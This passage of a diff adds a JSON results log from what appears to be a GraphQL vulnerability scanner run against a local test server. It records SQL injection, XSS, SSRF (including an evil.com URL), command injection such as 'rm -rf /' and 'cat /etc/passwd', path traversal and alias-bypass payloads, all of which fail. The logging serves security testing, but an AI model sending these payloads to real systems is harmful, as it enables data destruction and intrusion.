+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery IntrospectionQuery {\n  getLocation {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:46:53.573387Z",
+    "count": 75,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Location\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Location\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-104\") {\n    id\n    nam\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.013,
+    "timestamp": "2025-10-05T16:46:55.326560Z",
+    "count": 76,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"nam\" on type \"Location\". Did you mean \"name\" or \"lat\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"nam\" on type \"Location\". Did you mean \"name\" or \"lat\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-101\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:47:00.336001Z",
+    "count": 77,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"1' UNION SELECT '1', '2', '3', '4' --\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-05T16:47:02.301972Z",
+    "count": 78,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<script>alert('XSS')</script>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:47:04.575246Z",
+    "count": 79,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"http://evil.com/data\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:47:07.531160Z",
+    "count": 80,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"; rm -rf /; \") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:47:09.639256Z",
+    "count": 81,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"../../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:47:11.772054Z",
+    "count": 82,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<img src='x' onerror='alert(\\\"HTMLi\\\")'>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:47:13.921188Z",
+    "count": 83,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getLocation(locationID: \"loc-101\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.008,
+        "timestamp": "2025-10-05T16:47:15.731255Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:47:15.736372Z",
+        "response_body": {
+          "data": {
+            "aliasLocation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 84,
+    "timestamp": "2025-10-05T16:47:15.736395Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.013,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery Bypass {\n  aliasLocation: getLocation(locationID: \"loc-101\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.007,
+        "timestamp": "2025-10-05T16:47:18.213112Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-05T16:47:18.219185Z",
+        "response_body": {
+          "data": {
+            "aliasLocation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 85,
+    "timestamp": "2025-10-05T16:47:18.219209Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.011,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery IntrospectionQuery {\n  getLocation {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:47:20.864242Z",
+    "count": 86,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Location\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Location\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-101\") {\n    id\n    naame \n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:47:23.657900Z",
+    "count": 87,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"naame\" on type \"Location\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"naame\" on type \"Location\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-123\") {\n    id\n    name\n    lat\n    lng\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:47:28.718036Z",
+    "count": 88,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"1' UNION SELECT NULL, NULL, NULL, 'SQLi_Test'--\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-05T16:47:31.249924Z",
+    "count": 89,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<script>alert('XSS')</script>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-05T16:47:34.120371Z",
+    "count": 90,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"http://127.0.0.1:8080/admin\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:47:36.950458Z",
+    "count": 91,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-123; cat /etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:47:39.010492Z",
+    "count": 92,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"../../../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:47:41.276129Z",
+    "count": 93,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<img src=x onerror=alert('HTMLi')>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-05T16:47:42.851309Z",
+    "count": 94,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getLocation(locationID: \"loc-bypass-1\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:47:45.079534Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.004,
+        "timestamp": "2025-10-05T16:47:45.083336Z",
+        "response_body": {
+          "data": {
+            "bypassLocation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 95,
+    "timestamp": "2025-10-05T16:47:45.083348Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.011,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  bypassLocation: getLocation(locationID: \"loc-bypass-2\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.009,
+        "timestamp": "2025-10-05T16:47:47.911348Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.011,
+        "timestamp": "2025-10-05T16:47:47.922002Z",
+        "response_body": {
+          "data": {
+            "bypassLocation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 96,
+    "timestamp": "2025-10-05T16:47:47.922047Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.006,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery IntrospectionQuery {\n  getLocation {\n    queryType {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:47:49.742261Z",
+    "count": 97,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"queryType\" on type \"Location\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"queryType\" on type \"Location\".",
